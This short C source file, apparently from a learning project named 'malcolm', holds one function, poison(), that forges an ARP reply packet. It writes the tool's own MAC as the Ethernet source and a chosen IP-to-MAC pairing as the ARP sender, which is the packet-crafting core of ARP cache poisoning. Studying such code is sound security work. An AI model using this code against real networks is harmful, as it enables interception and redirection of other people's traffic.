//
// Created by tnoulens on 11/3/23.
//

#include "malcolm.h"

void    poison(t_data *data, t_arp_packet *rep, struct ethhdr *eth)
{
	// Edit Ethernet transmission layer
	ft_memcpy(eth->h_dest, data->target_mac, ETH_ALEN);
	ft_memcpy(eth->h_source, data->my_mac, ETH_ALEN);
	// Edit Ethernet packet data
	rep->arp_opcode = ntohs(ARPOP_REPLY);
	// The addr in argv is in network order since the parsing
	// Edit the destination and sender address and hardware address
	rep->arp_spa = data->source.sin_addr.s_addr;
	ft_memcpy(rep->arp_sha, data->source_mac, ETH_ALEN);
	rep->arp_dpa = data->target.sin_addr.s_addr;
	ft_memcpy(rep->arp_dha, data->target_mac, ETH_ALEN);
}
